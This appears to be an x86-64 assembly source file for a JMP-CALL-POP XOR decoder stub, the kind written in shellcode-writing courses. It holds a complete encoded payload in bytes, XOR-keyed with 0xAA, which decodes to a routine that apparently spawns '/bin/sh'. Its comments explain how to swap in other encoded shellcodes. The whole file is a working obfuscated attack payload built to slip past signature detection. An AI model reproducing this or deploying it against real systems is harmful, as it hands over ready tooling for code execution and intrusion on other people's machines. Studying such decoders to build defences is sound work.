; Author : Abhinav Thakur
; Email  : compilepeace@gmail.com
;
; Description : The code generates a shellcode with a decoder stub which will decode the XOR
;				Shellcode shellcode and then execute it. Here we use the JMP-CALL-POP instructions.
;				Fill in The size of Shellcode shellcode(in RCX, line 26) and the encoded Shellcode
;				(with comma separated values, line 35).
;				Here we are selecting '0xAA' as the decoder byte. Only shellcodes Shellcode with
;				'0xAA' as the encoder byte will be decoded and generated by this decoder.
;
; SHELLCODE LENGTH = 53 bytes 
;


global _start


section .text
_start:

	jmp PushShellcodeAddress


DecoderStub:

	pop	rbx					; RBX now contains the address of the Shellcode shellcode
	
	; Get ready for a lOop to decode the shellcode
	xor rcx, rcx			
	add	cl, 30				; Length of Shellcode shellcode

decode:
	xor	byte [rbx + rcx - 0x1], 0xAA	
	loop decode
	
	jmp Shellcode

PushShellcodeAddress:

	call DecoderStub
	Shellcode:	db	0x41,0xba,0xf5,0xfd,0xe2,0x23,0x4c,0xe2,0x9b,0x6a,0xfa,0xe2,0x23,0x48,0x1a,0x91,0xa5,0xaf,0x42,0x41,0x55,0x55,0x55,0x85,0xc8,0xc3,0xc4,0x85,0xd9,0xc2
